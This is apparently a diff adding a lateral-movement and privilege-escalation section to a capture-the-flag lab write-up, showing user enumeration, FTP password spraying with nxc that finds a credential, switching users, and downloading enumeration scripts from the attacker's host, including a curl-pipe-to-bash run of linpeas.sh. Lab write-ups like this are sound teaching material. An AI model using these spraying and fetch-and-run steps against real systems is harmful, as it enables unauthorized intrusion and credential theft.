@@ -224,6 +224,92 @@ drwx------ 2 user1 user1 4.0K Sep 21 17:27 .ssh
 
 
 ## Lateral Movement / Privilege Escalation
+
+Enumerated other users. Threw them into *usernames.txt*
+
+```bash
+user1@ip-10-1-39-71:~$ ls /home
+ftpuser  ubuntu  user1  user2  user3
+```
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ cat usernames.txt 
+user1
+user2
+user3
+ftpuser
+root
+```
+
+I'll try to see if any of these users can get access via FTP or SSH.
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ nxc ftp $ascension -u usernames.txt -p usernames.txt 
+```
+
+Tried usernames as passwords first (as always). No dice. 
+
+Now I'll try that password list we got via FTP from earlier:
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ nxc ftp $ascension -u usernames.txt -p pwlist.txt
+...
+FTP         10.1.39.71      21     10.1.39.71       [+] ftpuser:secret 
+```
+
+Excellent, we've found *ftpuser:secret*
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ ssh ftpuser@$ascension
+ftpuser@10.1.39.71: Permission denied (publickey).
+```
+
+The user can SSH without a key. Let's try to switch user context from the SSH session we have with user1:
+
+```bash
+user1@ip-10-1-39-71:~$ su ftpuser
+Password:      
+ftpuser@ip-10-1-39-71:/home/user1$    
+```
+
+We've successfully switched contxt to *ftpuser*.
+
+
+```bash
+user1@ip-10-1-39-71:~$ wget http://10.200.18.143:8000/lin/suid3num.py                                                                                                                                                
+--2025-11-03 16:05:24--  http://10.200.18.143:8000/lin/suid3num.py                                          Saving to: ‘suid3num.py’
+suid3num.py                100%[========================================>]  16.24K  --.-KB/s    in 0.09s                                                                                                            
+2025-11-03 16:05:24 (181 KB/s) - ‘suid3num.py’ saved [16632/16632]
+user1@ip-10-1-39-71:~$ chmod +x suid3num.py
+user1@ip-10-1-39-71:~$ python3 suid3num.py                         
+...
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+/usr/bin/fusermount3
+------------------------------
+
+
+[#] SUID Binaries found in GTFO bins..
+------------------------------
+[!] None :(
+------------------------------
+```
+
+```bash
+user1@ip-10-1-39-71:~$ curl http://10.200.18.143:8000/lin/linpeas.sh | bash
+```
+
+![Exploitable privesc vector](/assets/img/ctf/hs/easy/ascension/3.png)
+
+
+```bash
+/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
+```
+
 ## Root / SYSTEM
 # Lessons Learned
 
